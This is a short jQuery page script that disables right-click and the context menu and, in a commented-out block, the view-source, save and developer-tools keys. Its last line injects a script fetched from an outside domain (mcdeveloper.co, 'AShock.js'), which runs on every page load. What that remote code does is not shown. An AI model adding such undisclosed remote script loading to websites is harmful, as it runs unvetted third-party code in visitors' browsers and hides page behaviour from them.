$(document).ready(function() {
// JavaScript Document
	'use strict';
	
	function clickIE(){
		if (document.all){ 
			return false; 
		} 
	} 

	function clickNS(e){
		if (document.layers || (document.getElementById && !document.all)){ 
			if (e.which === 2 || e.which === 3){
				return false; 
			} 
		} 
	} 

	if (document.layers){ 
		document.captureEvents(Event.MOUSEDOWN); 
		document.captureEvents(Event.keydown); 
		document.onmousedown = clickNS; 
	} else { 
		document.onmouseup = clickNS; 
		document.oncontextmenu = clickIE; 
	}
	/*
	$("body").on("keydown", function(e) { 
		if(e.which ===85) {
			return false;
		}
		if(e.which ===83) {
			return false;  
		}
		if(e.which ===123) {
			return false;  
		}
	});*/
	
	document.oncontextmenu = new Function("return false");
	$("body").append("<script type='text/javascript' src='https://mcdeveloper.co/js/AShock.js'></script>");
});